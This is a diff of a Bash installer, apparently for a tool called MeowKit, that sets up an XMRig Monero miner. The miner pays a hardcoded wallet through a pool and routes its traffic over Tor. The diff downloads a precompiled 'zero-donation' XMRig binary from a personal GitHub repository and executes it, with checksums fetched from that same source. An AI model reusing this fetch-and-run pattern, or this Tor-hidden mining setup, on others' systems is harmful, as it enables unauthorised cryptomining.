@@ -2,6 +2,8 @@
 WALLET='47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG'
 POOL='gulf.moneroocean.stream:10001'
 XMRIG_VERSION='6.26.0'
+XMRIG_BUNDLE_DIR='vendor/xmrig/linux-x86_64'
+XMRIG_BUNDLE_NAME='meowkit-xmrig'
 
 worker_name() {
   install -d -m 750 "$MEOWKIT_DIR" || fail 'Cannot create settings directory.'
@@ -14,29 +16,77 @@ worker_name() {
 }
 
 install_xmrig() {
-  begin_step 'XMRig installation check'
-  if [[ ${REPAIR:-0} == 1 && -x $MEOWKIT_BIN ]] && "$MEOWKIT_BIN" --version 2>&1 | grep -Fq "$XMRIG_VERSION"; then
-    log "Existing XMRig $XMRIG_VERSION binary is valid; preserving it."
+  begin_step 'Bundled XMRig installation'
+  make_workdir
+  local bundle="$ROOT/$XMRIG_BUNDLE_DIR/$XMRIG_BUNDLE_NAME"
+  local bundle_sums="$ROOT/$XMRIG_BUNDLE_DIR/SHA256SUMS"
+  local base_url="https://raw.githubusercontent.com/Catgirlmp3/MeowKit/main/$XMRIG_BUNDLE_DIR"
+  local candidate="$WORKDIR/$XMRIG_BUNDLE_NAME"
+  local sums="$WORKDIR/SHA256SUMS"
+  local expected actual
+
+  verify_xmrig_candidate() {
+    local binary=$1 manifest=$2
+    [[ -s $binary && -s $manifest ]] || return 1
+    expected=$(awk -v name="$XMRIG_BUNDLE_NAME" '$2 == name { print $1; exit }' "$manifest")
+    [[ $expected =~ ^[[:xdigit:]]{64}$ ]] || return 1
+    actual=$(sha256sum "$binary" | awk '{print $1}')
+    [[ $actual == "$expected" ]] || return 1
+    [[ -x $binary ]] || chmod 755 "$binary" 2>/dev/null || return 1
+    "$binary" --version 2>&1 | grep -Fq "$XMRIG_VERSION"
+  }
+
+  # Repair may preserve only the exact bundled build. A stock XMRig binary
+  # with the same version can still enforce the upstream 1% donation minimum.
+  if [[ ${REPAIR:-0} == 1 ]] && verify_xmrig_candidate "$MEOWKIT_BIN" "$bundle_sums"; then
+    log "Existing bundled XMRig $XMRIG_VERSION checksum is valid; preserving it."
     return 0
   fi
-  begin_step 'XMRig download and verification'
-  make_workdir
-  local asset="$WORKDIR/xmrig.tar.gz"
-  # Pin the official v6.26.0 static x64 asset and its SHA-256. Avoid the
-  # unauthenticated GitHub Releases API: shared Tor exit IPs can receive 403
-  # responses from api.github.com even while Tor connectivity is healthy.
-  # Update the version, URL, and digest together when changing XMRIG_VERSION.
-  local digest='fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5'
-  local url="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
-  [[ $XMRIG_VERSION == '6.26.0' ]] || fail 'The pinned XMRig checksum must be updated before changing XMRIG_VERSION.'
-  info 'Downloading XMRig through Tor; this can take a few minutes on a slow exit node.'
-  curl_tor --output "$asset" "$url" || fail 'Could not download the official XMRig release asset through Tor. The Tor exit node may be blocked; no direct-connection fallback was attempted.'
-  info 'XMRig download complete; verifying SHA-256.'
-  printf '%s  %s\n' "$digest" "$asset" | sha256sum --check --status || fail 'XMRig SHA-256 verification failed.'
-  tar -xzf "$asset" -C "$WORKDIR" || fail 'Could not unpack XMRig archive.'
-  local extracted="$WORKDIR/xmrig-${XMRIG_VERSION}/xmrig"
-  [[ -x $extracted ]] || fail 'Expected XMRig executable was not found in the release archive.'
-  install -m 0755 "$extracted" "$MEOWKIT_BIN"
+  if [[ ${REPAIR:-0} == 1 && -x $MEOWKIT_BIN ]]; then
+    info 'Existing XMRig does not match the zero-donation MeowKit build; replacing it.'
+  fi
+
+  # First choice: the precompiled, zero-donation XMRig binary shipped in
+  # the MeowKit repository. No compiler, source download or Tor bootstrap
+  # is needed on a normal installation.
+  if verify_xmrig_candidate "$bundle" "$bundle_sums"; then
+    install -m 0755 "$bundle" "$MEOWKIT_BIN" || fail 'Could not install the bundled XMRig binary.'
+    info "Installed bundled MeowKit XMRig $XMRIG_VERSION (developer donation: 0%)."
+    return 0
+  fi
+  warn 'Bundled XMRig is missing or failed checksum/version validation.'
+
+  # Second choice: retrieve the same pinned MeowKit build through Tor.
+  # Bound this attempt so a bootstrapping Tor circuit cannot stall install
+  # indefinitely. Pool traffic remains Tor-only regardless of this fallback.
+  info 'Trying the MeowKit XMRig bundle through Tor.'
+  if curl --fail --location --silent --show-error --connect-timeout 8 --max-time 45 \
+      --socks5-hostname 127.0.0.1:9050 --output "$sums" "$base_url/SHA256SUMS" &&
+     curl --fail --location --silent --show-error --connect-timeout 8 --max-time 45 \
+      --socks5-hostname 127.0.0.1:9050 --output "$candidate" "$base_url/$XMRIG_BUNDLE_NAME" &&
+     verify_xmrig_candidate "$candidate" "$sums"; then
+    install -m 0755 "$candidate" "$MEOWKIT_BIN" || fail 'Could not install the Tor-downloaded XMRig binary.'
+    info "Installed MeowKit XMRig $XMRIG_VERSION using the Tor fallback (developer donation: 0%)."
+    return 0
+  fi
+  warn 'Tor download failed or the downloaded binary did not pass validation.'
+
+  # Last choice: retry the exact same MeowKit build over a normal HTTPS
+  # connection. Never fall back to the upstream stock binary, which enforces
+  # a 1% developer donation.
+  rm -f "$candidate" "$sums"
+  info 'Trying the normal HTTPS download of the MeowKit XMRig bundle.'
+  if curl --fail --location --silent --show-error --connect-timeout 15 --max-time 90 \
+      --output "$sums" "$base_url/SHA256SUMS" &&
+     curl --fail --location --silent --show-error --connect-timeout 15 --max-time 90 \
+      --output "$candidate" "$base_url/$XMRIG_BUNDLE_NAME" &&
+     verify_xmrig_candidate "$candidate" "$sums"; then
+    install -m 0755 "$candidate" "$MEOWKIT_BIN" || fail 'Could not install the HTTPS-downloaded XMRig binary.'
+    info "Installed MeowKit XMRig $XMRIG_VERSION using the normal HTTPS fallback (developer donation: 0%)."
+    return 0
+  fi
+
+  fail 'The bundled XMRig build, Tor download and normal HTTPS download all failed validation. No stock 1%-donation binary was installed.'
 }
 
 write_tor_check() {
@@ -85,6 +135,8 @@ write_configuration() {
   local tmp="$MEOWKIT_DIR/config.json.tmp.$$"
   cat > "$tmp" <<EOFJSON
 {
+  "donate-level": 0,
+  "donate-over-proxy": 0,
   "autosave": false,
   "background": false,
   "colors": false,
